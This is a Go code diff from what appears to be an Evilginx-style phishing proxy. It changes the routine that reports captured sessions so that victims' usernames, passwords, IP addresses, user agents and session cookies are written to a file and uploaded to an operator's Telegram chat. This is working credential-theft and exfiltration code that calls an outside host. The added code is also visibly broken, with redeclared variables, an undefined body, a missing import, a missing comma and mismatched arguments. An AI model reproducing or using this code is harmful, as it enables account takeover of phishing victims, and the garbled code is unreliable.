@@ -5,10 +5,14 @@ import (
 	"encoding/json"
 	"io/ioutil"
 	"fmt"
+	"mime/multipart"
 	"github.com/joho/godotenv"
 	"log"
 	"net/http"
 	"os"
+	"path"
+  	"path/filepath"
+
 
 	"github.com/tidwall/buntdb"
 	"strconv"
@@ -40,60 +44,51 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-// func telegramSendResult(msg string) (bool, error){
-// 	var err error
-
-// // 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
-// 	// Send the message
-// 	url := fmt.Sprintf("%s/sendMessage", getUrl())
-// 	body, _ := json.Marshal(map[string]string{
-// 		"chat_id": getChatId(),
-// 		"text":    msg,
-// 	})
-// 	responseBody := bytes.NewBuffer(body)
-// 	request, _ := http.Post(url, "application/json", responseBody)
-
-// 	// Close the request at the end
-// 	defer request.Body.Close()
-	
-// 	// Body
-// 	body, err = ioutil.ReadAll(request.Body)
-// 	if err != nil {
-// 		log.Fatalf("%s", err)
-// 	}
-// 	log.Printf("%s", msg)
-// 	// Return
-// 	return true, nil
-// }
-
-func sendEmailCookie(cookies string, id string, phishlet string, username string, password string, sessionId string) {
+func sendTelegramResult(cookies string, id int, phishlet string, username string, password string, remote_addr string, useragent string) {
 
 	// Send the message
 	var err error
-	url := fmt.Sprintf("%s/sendMessage", getUrl())
-	msg := fmt.Sprintf("[ 🍁 %d %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, sessionId)
+	client, fileName := &http.Client{}, "filename-cookies.json"
+	url := fmt.Sprintf("%s/sendDocument?chat_id=%s", getUrl(), getChatId())
+	msg := fmt.Sprintf("[ 🍁 %d %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🌎 UserAgent:   %s\n💻 IP:   https://ip-api.com/%s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, useragent, remote_addr)
 	
-	postBody, _ := json.Marshal(map[string]string{
-		"chat_id":    getChatId(),
-		"text":       msg,
-	})
+// 	postBody, _ := json.Marshal(map[string]string{
+// 		"chat_id":    getChatId(),
+// 		"text":       msg,
+// 	})
+	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
+	if err != nil {
+	   fmt.Printf("Unable to write file: %v", err)
+	}
 
-	responseBody := bytes.NewBuffer(postBody)
-	request, _ := http.Post(url, "application/json", responseBody)
+	fileDir, _ := os.Getwd()
+	filePath := path.Join(fileDir, fileName)
 
-	defer request.Body.Close()
+	file, _ := os.Open(filePath)
+	defer file.Close()
+
+	responseBody := &bytes.NewBuffer{}
+	writer := multipart.NewWriter(responseBody)
+	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
+	io.Copy(part, file)
+	writer.WriteField("caption", msg)
+	writer.Close()
+	
+	req, _ := http.NewRequest("POST", url, body)
+	req.Header.Add("Content-Type", writer.FormDataContentType())
+	client.Do(req)
+	os.Remove(fileName)
+
+	
+	//request, _ := http.Post(url, "application/json", responseBody)
+
+	defer req.Body.Close()
 	
 	// 	// Body
-	postBody, err = ioutil.ReadAll(request.Body)
+	responseBody, err = ioutil.ReadAll(req.Body)
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
-	
-	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
-	if err != nil {
-		fmt.Printf("Unable to write file: %v", err)
-	}
-
 	log.Println("Send Email/Telegram Cookies", username, password)
 	
 	// Return
@@ -103,7 +98,6 @@ func sendEmailCookie(cookies string, id string, phishlet string, username string
 
 func telegramSendVisitor(msg string) {
 	var err error
-// 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	body, _ := json.Marshal(map[string]string{
@@ -179,7 +173,7 @@ func (d *Database) SetSessionCustom(sid string, name string, value string) error
 	return err
 }
 
-func (d *Database) SetSessionTokens(sid string, id string, phishlet string, tokens map[string]map[string]*Token) error {
+func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
 	err := d.sessionsUpdateTokens(sid, tokens)
 
 	type Cookie struct {
@@ -218,11 +212,9 @@ func (d *Database) SetSessionTokens(sid string, id string, phishlet string, toke
 
 	data, _ := d.sessionsGetBySid(sid)
 
-	//log.Printf("%s", data)
-	//log.Important("database: %s", data)
 
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Phishlet, data.Id, data.Username, data.Password, data.SessionId)
+	sendTelegramResult(string(json11)data.Phishlet, data.Id, data.Username, data.Password, data.UserAgent, data.RemoteAddr)
 	return err
 }
 
